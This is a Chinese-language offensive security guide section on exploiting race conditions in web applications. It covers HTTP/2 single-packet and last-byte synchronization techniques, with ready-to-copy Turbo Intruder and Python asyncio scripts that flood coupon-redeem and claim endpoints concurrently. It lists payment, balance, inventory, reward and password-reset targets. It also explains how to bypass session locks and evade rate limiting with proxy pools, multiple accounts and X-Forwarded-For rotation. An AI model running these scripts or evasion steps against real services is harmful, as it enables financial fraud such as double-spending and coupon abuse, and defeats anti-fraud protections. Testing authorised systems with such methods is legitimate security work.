## 三、竞态条件实战（Race Condition）

### 3.1 竞态条件原理与分类

**定义**：程序行为依赖并发事件的相对时序（CWE-362）。多个线程同时读写共享状态，若"检查-使用"非原子，就产生竞态窗口，导致碰撞（collision）。

**实战分类（PortSwigger "Smashing the state machine"）：**
```
1. Limit Overrun（限额超限，对应 BLA1）：
   检查"是否已使用过"→ 应用优惠 → 标记已使用。三个步骤之间并发 N 个请求
   → N 个请求都通过检查 → 优惠券/兑换码/验证码/签到奖励被重复使用 N 次
2. Multi-endpoint race（多端点竞态）：
   端点 A 生成一次性 token/优惠码，端点 B 消耗它。并发触发 A×1 + B×N → B 全部通过
3. Single-endpoint race（单端点竞态）：同上但同一端点
4. Time-sensitive attack（时间敏感攻击）：
   基于系统时间/时间戳的检查（如"本日已签到"）——在日期变更瞬间（23:59:59.999）并发触发
5. Partial construction（部分构造竞态）：
   对象创建流程被中断/半初始化（如注册后未激活但可先登录利用半初始化状态）
6. TOCTOU（检查-使用）：文件、权限、余额、状态检查与后续使用之间的窗口
7. Double-Spend（双重花费）：同一资源被并发消耗多次
```

### 3.2 HTTP/2 单包攻击（Single Packet Attack，首选）

**原理**（Black Hat USA 2023，James Kettle）：
```
1. 在单条 HTTP/2 连接上发起 20-30 个请求
2. 每个请求先发送 99% 内容（不含结尾字节），服务器不会处理不完整请求
3. 短暂等待后同时发送全部请求的最后一个字节
4. 操作系统将全部结尾字节打包进单个 TCP 包 → 20-30 个请求同时到达服务器
5. 消除网络抖动（jitter），远程竞态变成"本地竞态"，利用成功率接近 100%
```

**检测流程（PortSwigger 方法论）：**
```
1. Predict（预测碰撞点）：找出"检查-使用"窗口（兑换码、验证码、余额、库存、限额）
2. Probe（探测）：用单包攻击并发 20 个请求，观察是否有 >1 个成功
3. Prove（证明）：构造 PoC 复现并量化影响
```

### 3.3 HTTP/1.1 末字节同步（Last-Byte Synchronization）

```
适用：目标仅支持 HTTP/1.1（无 HTTP/2）
步骤：
1. 并行建立 20-30 条连接（每请求一条）
2. 发送完整请求但扣住最后一个字节
3. 等待 100ms 让请求到达服务器
4. 关闭 TCP_NODELAY 利用 Nagle 算法聚合，同时发送扣住的末字节
5. 全部请求末字节进入同一 TCP 包 → 同时被服务器解析
（用 Wireshark 验证：末字节是否同包）
```

### 3.4 Turbo Intruder 实战脚本（可直接复制）

**单端点 HTTP/2 单包攻击（20 个并发请求同触发）：**
```python
def queueRequests(target, wordlists):
    # 目标支持 HTTP/2 用 Engine.BURP2 触发单包攻击
    # 仅 HTTP/1.1 时改用 Engine.THREADED 或 Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # gate 参数先扣住每个请求的结尾，openGate 时一起发出（单包）
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**多端点竞态（1 个请求触发 + 50 个消耗请求）：**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    # 硬编码第二个端点请求（消耗一次性 token 的请求）
    consumeReq = '''POST /coupon/redeem HTTP/2
Host: target.com
Cookie: session=xxx
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

'''
    for attempt in range(20):
        cur = str(attempt)
        # 先发 1 个"生成"请求（触发服务器生成一次性兑换码）
        engine.queue(target.req, cur, gate=cur)
        # 并发 50 个"消耗"请求（全部抢同一兑换码）
        for i in range(50):
            engine.queue(consumeReq, gate=cur)
        engine.openGate(cur)

def handleResponse(req, interesting):
    table.add(req)
```

**Payload 变量化（替换请求中 %s 为字典值）：**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    words = wordlists.clipboard  # 从剪贴板读取字典
    for word in words:
        engine.queue(target.req, word, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Burp Repeater 替代方案：** Repeater 标签组 → "Send group in parallel"（发送并行组），或使用 `%s` 标记后右键 → 并行发送 20 个请求，效果等同单包攻击。

### 3.5 支付/转账/库存竞态（经典场景）

```
1. 库存超卖：
   检查 stock>0 → 扣减 stock。并发 100 单 → 库存 1 卖出 100 件
2. 余额转账：
   检查 balance>=amount → 扣减。并发转出 → 余额为负 / 多次到账
3. 提现限额：
   检查"今日已提现<限额" → 入账。并发 N 次 → 突破限额（BLA1）
4. 优惠券/兑换码：
   检查"未使用" → 应用。并发 → 同一券码使用 N 次 / 同人领 N 张
5. 签到/每日奖励：
   检查"今日未签到" → 发奖励。日期变更瞬间并发 → 多次奖励
6. 验证码/重置 token：
   检查"token 未使用" → 重置密码。并发 → 同一 token 重置多次 / 多设备同时重置
7. 注册送积分/新客红包：
   检查"新用户" → 发红包。并发注册 → 领多次（需配合多身份）
8. 拍卖/秒杀：
   检查"未结束" → 下单。结束瞬间并发 → 结束前下单成功
```

**验证脚本（Python asyncio + aiohttp，需 `pip install aiohttp`）：**
```python
import asyncio
import aiohttp

async def claim(session, url, data):
    try:
        async with session.post(url, json=data, timeout=10) as resp:
            return resp.status, await resp.text()
    except Exception as e:
        return None, str(e)

async def main():
    url = "https://target.com/api/coupon/claim"
    data = {"coupon_id": "FREE100"}
    # 大连接池模拟并发，减少 TCP 握手开销
    conn = aiohttp.TCPConnector(limit=200)
    async with aiohttp.ClientSession(connector=conn) as session:
        # 预热连接
        await session.get("https://target.com/")
        tasks = [claim(session, url, data) for _ in range(200)]
        results = await asyncio.gather(*tasks)
        success = [r for r in results if r[0] == 200]
        print(f"total={len(results)} success={len(success)}")
        for r in success[:5]:
            print(r)

asyncio.run(main())
```

### 3.6 多端点竞态与连接预热（Connection Warming）

```
问题：请求经负载均衡/网关转发，不同请求可能被路由到不同后端，时序不一致
对策：
1. 连接预热：先发几个"无害请求"（GET / 或登录）让连接/路由/TLS 会话建立完成
2. 观察响应时间：正常请求耗时<100ms 才有竞态窗口；>500ms 的接口竞态窗口大易触发
3. 反向代理缓冲：若前置代理缓存/缓冲请求体，末字节同步仍有效（代理也按包转发）
4. 会话级锁（Session-based locking）：PHP 默认按 session 串行化请求 → 竞态被隐藏！
   → 对策：每个请求用不同的 session token（new session per request）绕过锁
5. 应用级锁：检查-使用之间若加了互斥锁（悲观锁）→ 竞态不存在，转测"锁的粒度"
   （锁的是用户还是商品？锁的是订单还是全局？锁粒度不够仍可并发）
6. 数据存储差异：Redis 单线程 vs MySQL 行锁 vs 无锁 → 决定竞态是否可利用
```

### 3.7 会话锁绕过与限流对抗

```
# 会话锁绕过：每请求独立 session
for i in range(20):
    session = requests.Session()          # 或修改 Cookie 中 session id
    session.post(url, json=data)

# 限流对抗（并发测试时避免触发风控）：
1. 分布式：多 IP（代理池）、多账号、多手机号
2. 变速：突发脉冲式（高并发短时间）而非匀速
3. 多端点分摊：同一操作的不同 API 入口轮流打
4. XFF 变形：X-Forwarded-For / X-Real-IP / Client-IP 轮换
5. 慢速预热：先低并发探测窗口，再瞬间加大到目标并发
6. 时间错峰：配合定时任务/缓存过期瞬间（如 Redis 缓存 1s 过期点）触发
```

### 3.8 时间敏感攻击与部分构造竞态

```
1. 日期边界：23:59:59.9 并发签到/领每日奖励 → 跨天双领
2. 缓存过期点：优惠券可用状态缓存 TTL 过期瞬间并发（攻击缓存窗口）
3. 定时任务竞态：对账任务/结算任务执行瞬间提交数据
4. 部分构造竞态（Partial Construction）：
   - 注册接口创建用户但"激活"步骤异步/延迟 → 激活前登录利用半初始化状态
   - 创建订单但"扣库存"延迟 → 下单后、扣减前并发下单
   - 上传文件先落盘后校验 → 校验前访问文件
5. 检测技巧：响应中 302/重定向次数不同、状态码不同、错误信息不同 = 命中竞态迹象
```

